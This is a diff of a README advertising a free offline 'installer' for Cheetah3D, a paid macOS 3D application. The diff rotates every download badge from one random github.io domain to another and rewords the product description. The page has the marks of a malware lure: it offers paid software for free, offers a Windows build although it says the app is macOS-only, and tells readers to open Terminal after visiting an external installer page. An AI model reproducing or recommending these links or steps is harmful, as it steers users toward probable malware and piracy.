@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-3D+Modeling-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Cheetah3D Free Installer** — Cheetah3D is a 3D modeling, rendering, and animation application exclusively for macOS. Works without internet access, no account required. Full offline installation.
+**💻 Cheetah3D Free Installer** — Cheetah3D is a macOS 3D modeling, rendering, and animation application targeted at beginners and hobbyists. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Cheetah3D](https://img.shields.io/badge/⬇_Install_Cheetah3D-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Cheetah3D](https://img.shields.io/badge/⬇_Install_Cheetah3D-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Cheetah3D
 
-Cheetah3D is a 3D modeling, rendering, and animation application exclusively for macOS. With a clean interface optimized for Mac workflows, Cheetah3D supports polygon modeling, subdivision surfaces, spline modeling, and a node-based render engine. Popular among Mac users who want professional 3D capabilities without the complexity of Blender or the cost of Cinema 4D.
+Cheetah3D is a macOS 3D modeling, rendering, and animation application targeted at beginners and hobbyists. It provides a clean, approachable interface for polygon modeling, subdivision surfaces, particle systems, and a physical renderer.
 
 ---
 
 ## ❌ Problem: Cheetah3D is hard to access
 
-- **macOS Only** — No Windows or Linux version
-- **Commercial License** — Paid application
-- **Ecosystem** — Smaller plugin and asset community than major 3D applications
-- **Advanced Features** — Some production-level features less developed than Cinema 4D
+- **macOS Only** — No Windows or Linux version available
+- **Paid License** — Requires purchase
+- **Beginner Focus** — Less capable than Blender for advanced 3D production work
+- **Small Community** — Limited tutorials and resources compared to Blender
 
 ---
 
@@ -61,9 +61,9 @@ Cheetah3D is a 3D modeling, rendering, and animation application exclusively for
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ Cheetah3D is a 3D modeling, rendering, and animation application exclusively for
 
 <div align="center">
 
-[![⬇ Install Cheetah3D](https://img.shields.io/badge/⬇_Install_Cheetah3D-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Cheetah3D](https://img.shields.io/badge/⬇_Install_Cheetah3D-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ Cheetah3D is a 3D modeling, rendering, and animation application exclusively for
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ Cheetah3D is a 3D modeling, rendering, and animation application exclusively for
 
 ---
 
-**Cheetah3D Free Installer** — Cheetah3D is a 3D modeling, rendering, and animation application exclusively for macOS. Install without internet connection today!
+**Cheetah3D Free Installer** — Cheetah3D is a macOS 3D modeling, rendering, and animation application targeted at beginners and hobbyists. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Cheetah3D](https://img.shields.io/badge/⬇_Install_Cheetah3D-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Cheetah3D](https://img.shields.io/badge/⬇_Install_Cheetah3D-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
